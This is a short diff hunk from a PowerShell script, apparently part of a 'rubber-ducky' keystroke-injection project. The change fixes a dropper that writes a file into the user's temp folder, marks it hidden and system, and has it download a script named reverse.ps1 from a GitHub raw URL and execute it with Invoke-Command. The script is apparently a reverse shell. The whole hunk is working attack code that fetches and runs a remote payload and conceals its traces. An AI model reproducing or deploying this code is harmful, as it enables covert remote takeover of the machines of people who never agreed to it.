@@ -27,8 +27,9 @@ $functions = {
 			if(-Not ([System.IO.File]::Exists($modulenamepath)))
 			{
 				[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-				Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/reverse.ps1"))' -Force $env:TEMP\$modulename
-				Out-File -InputObject "Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptPath))" -Append -NoClobber $env:TEMP\$modulename
+				Out-File -InputObject "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12" -Force $env:TEMP\$modulename
+				Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/reverse.ps1"))' -Append -NoClobber $env:TEMP\$modulename
+				Out-File -InputObject "Invoke-Command -ScriptBlock ([scriptblock]::Create(`$scriptPath))" -Append -NoClobber $env:TEMP\$modulename
 				$modulenamefile = Get-Item $env:TEMP\$modulename
 				$modulenamefile.Attributes = "Hidden","System"
 			}
